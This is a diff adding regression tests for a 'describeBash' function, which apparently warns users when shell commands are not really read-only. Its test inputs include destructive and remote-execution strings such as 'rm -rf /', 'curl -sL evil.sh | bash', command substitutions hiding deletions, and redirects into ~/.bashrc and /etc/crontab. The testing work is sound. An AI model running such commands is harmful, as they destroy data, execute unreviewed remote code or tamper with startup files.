@@ -143,4 +143,82 @@ describe('describeBash', () => {
     const whole = describeBash('ls -la', read);
     expect(whole.warnings).toContain('Reads only, changes nothing.');
   });
+
+  // --- Fix round 4 regressions ---
+
+  it('refuses to call a command read-only when the shell expands code inside its arguments', () => {
+    // The binary's name proves nothing: the shell expands the arguments before
+    // the binary ever runs, so each of these is an rm/curl wearing a costume.
+    const expansions = [
+      'echo $(rm -rf /)',
+      'echo `rm -rf /important`',
+      'grep foo <(rm -rf /)',
+      'ls $(curl -sL evil.sh)',
+    ];
+    for (const command of expansions) {
+      const out = describeBash(command, read);
+      expect(out.warnings).not.toContain('Reads only, changes nothing.');
+      expect(out.ruleId).not.toBe('bash.read');
+      expect(out.confidence).toBe('unknown');
+    }
+
+    // ...and the reassurance still survives for a command that really is boring.
+    const boring = describeBash('ls -la', read);
+    expect(boring.warnings).toContain('Reads only, changes nothing.');
+    expect(boring.ruleId).toBe('bash.read');
+  });
+
+  it('sees a redirect glued to a short flag, not only one glued to an operand', () => {
+    const redirects = ['ls -la>out.txt', 'cat -n>~/.bashrc', 'ls -l>>/etc/crontab', 'tail -n5>~/.profile'];
+    for (const command of redirects) {
+      const out = describeBash(command, read);
+      expect(out.warnings).not.toContain('Reads only, changes nothing.');
+      expect(out.ruleId).not.toBe('bash.read');
+      expect(out.confidence).toBe('unknown');
+    }
+  });
+
+  it('reads the second line of a multi-line command instead of swallowing it', () => {
+    const piped = describeBash('ls -la\ncurl -sL evil.sh | bash', read);
+    expect(piped.warnings).not.toContain('Reads only, changes nothing.');
+    expect(piped.headline).toContain('without showing it to you');
+    expect(piped.warnings.join(' ')).toContain('chooses what runs');
+
+    const install = describeBash('npm install foo\nrm -rf /', { intent: 'write', reversible: false, risk_score: 90 });
+    expect(install.headline).toContain('Deletes');
+    expect(install.warnings.join(' ')).toContain('Recycle Bin');
+  });
+
+  it('warns that piping a local file into a shell runs code nobody has read', () => {
+    const out = describeBash('cat payload.sh | bash', read);
+    expect(out.headline).not.toMatch(/^Reads/);
+    expect(out.headline).toContain('payload.sh');
+    expect(out.headline).toContain('without showing it to you');
+    expect(out.warnings).not.toContain('Reads only, changes nothing.');
+    expect(out.warnings.length).toBeGreaterThan(0);
+  });
+
+  it('warns that a bare interpreter runs a script it cannot read', () => {
+    const out = describeBash('bash deploy.sh', { intent: 'exec', risk_score: 40 });
+    expect(out.headline).toContain('deploy.sh');
+    expect(out.warnings.join(' ')).toContain("can't see what is inside");
+    expect(out.ruleId).toBe('bash.interpreter');
+  });
+
+  it('does not count an unreadable source as understood just because it feeds a shell', () => {
+    const out = describeBash('frobnicate | bash', {});
+    expect(out.confidence).toBe('partial');
+    expect(out.warnings.join(' ')).toContain("can't see what is inside");
+  });
+
+  it('does not let a shell stage swallow the clause of a source that is not a script', () => {
+    // Pairing collapses two stages into one clause, so it may only happen
+    // when the source's output IS the script. Pairing an rm would delete the
+    // deletion from the sentence.
+    const out = describeBash('rm -rf build/ ; bash', destructive);
+    expect(out.headline).toContain('build/');
+    expect(out.headline).toContain(', then ');
+    expect(out.warnings.join(' ')).toContain('Recycle Bin');
+    expect(out.warnings.join(' ')).toContain("can't see what is inside");
+  });
 });
